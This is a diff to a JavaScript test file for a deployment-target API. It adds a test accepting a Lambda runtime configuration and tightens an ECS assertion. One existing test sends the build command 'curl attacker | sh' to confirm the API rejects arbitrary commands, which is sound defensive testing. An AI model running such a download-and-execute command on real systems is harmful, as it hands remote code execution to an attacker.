@@ -35,7 +35,12 @@ test("project deployment target API persists only structured confirmed build con
   assert.equal(response.statusCode, 200);
   assert.equal(response.json().target.runtimeTargetKind, "ecs_fargate");
   assert.equal(state.target?.confirmedBuildConfig?.buildPreset, "docker_build");
-  assert.equal(state.target?.runtimeConfig?.serviceName, "sketchcatch-api");
+  assert.equal(
+    state.target?.runtimeConfig?.runtimeTargetKind === "ecs_fargate"
+      ? state.target.runtimeConfig.serviceName
+      : null,
+    "sketchcatch-api"
+  );
 
   const arbitraryCommandResponse = await app.inject({
     method: "PUT",
@@ -44,6 +49,43 @@ test("project deployment target API persists only structured confirmed build con
     payload: { ...createTargetPayload(), buildCommand: "curl attacker | sh" }
   });
   assert.equal(arbitraryCommandResponse.statusCode, 400);
+});
+
+test("project deployment target API accepts a complete Lambda runtime contract", async (t) => {
+  const state = createRepositoryState();
+  const app = await buildRouteApp(state.repository);
+  t.after(() => app.close());
+  const payload = createTargetPayload();
+
+  const response = await app.inject({
+    method: "PUT",
+    url: `/api/projects/${projectId}/deployment-target`,
+    headers: await authHeaders(),
+    payload: {
+      ...payload,
+      runtimeTargetKind: "lambda",
+      runtimeConfig: {
+        runtimeTargetKind: "lambda",
+        functionLogicalId: "ApiFunction",
+        functionName: "sketchcatch-api",
+        aliasName: "live",
+        codeDeployApplicationName: "sketchcatch-api",
+        codeDeployDeploymentGroupName: "sketchcatch-api-live",
+        outputUrl: "https://lambda.example.com"
+      },
+      confirmedBuildConfig: {
+        ...payload.confirmedBuildConfig,
+        evidence: [{ kind: "sam_template", path: "template.yaml" }],
+        buildPreset: "sam_build",
+        dockerfilePath: null,
+        samTemplatePath: "template.yaml"
+      }
+    }
+  });
+
+  assert.equal(response.statusCode, 200);
+  assert.equal(response.json().target.runtimeConfig.functionName, "sketchcatch-api");
+  assert.equal(state.target?.runtimeTargetKind, "lambda");
 });
 
 test("release API returns Direct and GitOps rows from one project history", async (t) => {
